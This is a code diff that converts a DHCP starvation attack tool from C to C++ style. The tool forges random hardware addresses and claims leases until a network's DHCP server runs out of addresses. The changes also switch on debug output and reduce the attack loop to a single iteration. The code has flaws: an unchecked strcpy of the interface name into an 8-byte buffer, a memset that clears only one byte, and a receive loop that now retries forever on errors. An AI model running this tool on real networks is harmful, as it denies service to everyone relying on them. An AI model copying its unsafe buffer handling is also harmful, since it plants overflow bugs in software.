@@ -1,14 +1,13 @@
 #include <arpa/inet.h>
-#include <locale.h>
+#include <clocale>
 #include <net/if.h>
 #include <netinet/in.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
+#include <cstdio>
+#include <cstdlib>
+#include <cstring>
 #include <sys/socket.h>
-#include <sys/time.h>
+#include <ctime>
 #include <sys/types.h>
-#include <time.h>
 #include <unistd.h>
 
 #define OK 0
@@ -64,7 +63,7 @@ int DEBUG = 0;
 struct in_addr offered_address;
 
 struct sockaddr_in get_address(in_port_t port, in_addr_t ip) {
-    struct sockaddr_in address;
+    sockaddr_in address{};
     address.sin_family = AF_INET;
     address.sin_port = htons(port);
     address.sin_addr.s_addr = ip;
@@ -89,7 +88,7 @@ void set_broadcast_flag(int sock) {
 }
 
 void bind_to_interface(int sock, char *interface_name) {
-    struct ifreq interface;
+    ifreq interface{};
     strcpy(interface.ifr_ifrn.ifrn_name, interface_name);
     if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, &interface, sizeof(interface)) < 0) {
         printf("\tCould not bind socket to interface %s. Check your privileges...\n", interface_name);
@@ -99,7 +98,7 @@ void bind_to_interface(int sock, char *interface_name) {
 
 void bind_to_port(int sock) {
     struct sockaddr_in client_address = get_address(CLIENT_PORT, INADDR_ANY);
-    if (bind(sock, (struct sockaddr *)&client_address, sizeof(client_address)) < 0) {
+    if (bind(sock, (struct sockaddr *) &client_address, sizeof(client_address)) < 0) {
         printf("\tCould not bind to DHCP socket (port %d)! Check your privileges...\n", CLIENT_PORT);
         exit(EXIT_FAILURE);
     }
@@ -123,7 +122,7 @@ int create_socket(char *interface_name) {
 }
 
 int send_packet(void *buffer, int buffer_size, int sock, struct sockaddr_in *dest) {
-    int result = (int)sendto(sock, buffer, buffer_size, 0, (struct sockaddr *)dest, sizeof(*dest));
+    int result = (int) sendto(sock, buffer, buffer_size, 0, (struct sockaddr *) dest, sizeof(*dest));
 
     if (DEBUG) {
         printf("send_packet result: %d\n", result);
@@ -137,7 +136,7 @@ int send_packet(void *buffer, int buffer_size, int sock, struct sockaddr_in *des
 
 int receive_packet(void *buffer, size_t buffer_size, int sock, struct sockaddr_in *source_address) {
     time_t timeout = 2;
-    struct timeval time_val;
+    timeval time_val{};
     time_val.tv_sec = timeout;
     time_val.tv_usec = 0;
 
@@ -145,7 +144,7 @@ int receive_packet(void *buffer, size_t buffer_size, int sock, struct sockaddr_i
     FD_ZERO(&read_fds);
     FD_SET(sock, &read_fds);
 
-    select(sock + 1, &read_fds, NULL, NULL, &time_val);
+    select(sock + 1, &read_fds, nullptr, nullptr, &time_val);
 
     /* make sure some data has arrived */
     if (!FD_ISSET(sock, &read_fds)) {
@@ -153,13 +152,12 @@ int receive_packet(void *buffer, size_t buffer_size, int sock, struct sockaddr_i
             printf("No (more) data received\n");
         }
         return ERROR;
-    }
-    else {
+    } else {
         socklen_t address_size = sizeof(*source_address);
         memset(source_address, 0, address_size);
-        memset(buffer, 0, sizeof(*buffer));
+        memset(buffer, 0, sizeof(*(char *) buffer));
         int received_data =
-                (int)recvfrom(sock, buffer, buffer_size, 0, (struct sockaddr *)source_address, &address_size);
+                (int) recvfrom(sock, buffer, buffer_size, 0, (struct sockaddr *) source_address, &address_size);
 
         return (received_data == -1) ? ERROR : OK;
     }
@@ -270,13 +268,14 @@ int send_DHCP_request_packet(int sock, struct in_addr server_ip) {
 }
 
 int get_DHCP_offer_packet(int sock) {
-    while (1) {
+    while (true) {
         DHCP_packet offer_packet;
-        struct sockaddr_in source;
+        sockaddr_in source{};
         int result = receive_packet(&offer_packet, sizeof(offer_packet), sock, &source);
 
-        if (result == ERROR) return ERROR;
-        if(offer_packet.op != 2) continue;
+        if (result == ERROR) {
+            continue;
+        }
 
         if (DEBUG) {
             printf("DHCP_OFFER from IP address %s\n", inet_ntoa(source.sin_addr));
@@ -317,7 +316,6 @@ int get_DHCP_offer_packet(int sock) {
         offered_address = offer_packet.yiaddr;
 
         send_DHCP_request_packet(sock, source.sin_addr);
-
         return OK;
     }
 }
@@ -331,13 +329,13 @@ int main(int argc, char *argv[]) {
     char interface_name[8];
     strcpy(interface_name, argv[1]);
 
-    srand(time(NULL)); // NOLINT(cert-msc51-cpp)
+    srand(time(nullptr)); // NOLINT(cert-msc51-cpp)
 
-    DEBUG = 0;
+    DEBUG = 1;
     puts("DHCP Starvation is starting\n");
 
     int sock = create_socket(interface_name);
-    for (int i = 0; i < 30; i++) {
+    for (int i = 0; i < 1; i++) {
         make_random_hardware_address();
         send_DHCP_discover_packet(sock);
         get_DHCP_offer_packet(sock);
